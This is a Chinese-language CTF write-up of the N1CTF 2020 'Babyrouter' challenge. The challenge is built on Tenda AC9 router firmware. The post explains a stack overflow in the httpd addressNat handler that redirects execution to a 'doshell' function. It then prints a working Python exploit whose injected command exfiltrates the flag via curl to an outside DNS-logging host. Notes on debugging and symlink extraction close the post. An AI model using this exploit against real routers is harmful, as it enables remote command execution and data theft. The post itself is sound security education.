---
title: 作业没做完打不了N1CTF惨惨
author: nepire
avatar: 'https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg'
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2020-10-20 14:23:03
tags:
keywords:
description:
photos:
---
#n1ctf摸鱼路上财务报表作业要交了惨惨

做到后面突然想起了作业还没写，半途跑路（惨惨

赛后和出题人聊了下发现本来是0day题，但环境没配好，结果就是这题的利用简单了很多，虽然只有四解

#### Babyrouter


![](https://i.imgur.com/gds4EsC.png)


这次就整了这题，题目给了个docker包
![](https://i.imgur.com/cOIfqje.png)


但从我在Windows下解压这个环境的时候就gg了，这些环境问题最后再一起说

很明显的能知道我们需要分析的是httpd，经过简单的分析过后我们能知道这是

> Tenda AC9 V1.0 V15.03.05.19

的路由器的一部分，这种时候能去找cve或者直接挖0day来做题，脚本稍微扫一下

![](https://i.imgur.com/UYVl7Kb.png)


emmm，这里面应该不少0day但我还是直接找cve吧，一个个看过去可太慢了


随便拿了个出来发现确实存在，不过网上只有poc，exp需要我们自己去写
![](https://i.imgur.com/B3mPwaf.png)

![](https://i.imgur.com/TV5Kk9g.png)


最蛋疼的就是搭调试环境了，找洞三分钟，搭环境三小时
![](https://i.imgur.com/WBuOL9P.png)

当时在审计的时候看到字符串有个doshell还以为是什么官方后门，找到对应函数才发现不是，不过也为我们利用提供了不少便利，我们只要设置好$r11然后跳转到这就能任意命令执行
![](https://i.imgur.com/wmCkLXi.png)


这里先简单的介绍下ldr的命令

> LDR R0，[R1，#8] ；将存储器地址为R1+8的字数据读入寄存器R0

然后回到fromaddressnat

通过简单的测试后发现填充的cccc是返回地址，就是pc，修改对应位置为doshell所在的位置后重新调试成功跳转
![](https://i.imgur.com/X0XGxvH.png)


但由于\$r11和\$r4没设置成正确指针所以无法再继续步进，构造下指针就能任意代码执行了，懒的反弹shell就直接dns带出来了

![](https://i.imgur.com/Md98HDi.png)

exp如下

```python
#!/usr/bin/env python2
# n1ctf{42926f989b610f3f8e717d8a252bcc21}
from pwn import *
import requests
cmd = 'curl $(cat /flag).yf2erc.dnslog.cn;'
#cmd = ""
payload  = p32(0xf6fff9ec+4)+cmd.ljust(0xf0,"a")
payload += p32(0xf6fff9ec+16)
payload += p32(0x6B154)
data = {'entrys':'aaaa','mitInterface':'aaaa','page':payload}
cookie = {'Cookie':'password=1234'}
#r = requests.post('http://127.0.0.1:2333/goform/addressNat',data = data,cookies=cookie)
r = requests.post('http://8.210.119.59:9990/goform/addressNat',data = data,cookies=cookie)
```



重点笔记开始了，主要有两个总结的地方

1.lib的链接问题

我在上面也讲了，在Windows下解压这个环境gg了，先说结果，在windows下解压带符号链接的zip包时会导致链接失效变成ascii文本，然后在我写这篇文章时发现即使在ubuntu环境下，利用ubuntu自带的gui解压工具把文件拖出来链接文件是直接不显示不解析，也不会解压
![](https://i.imgur.com/i5UNKg8.png)


只有`unzip file.zip`才能正常带符号的解压出来

2.调试环境

这次比较好整，就改了run.sh和start.sh两个文件修改如下
![](https://i.imgur.com/sdI1UiX.png)
![](https://i.imgur.com/N0QYurf.png)


剩下的就是外部使用gdb-multiarch调试本地1147端口，都是传统调试方法，然后还是推一波我的gdb环境

https://github.com/Nepire/Pwngdb
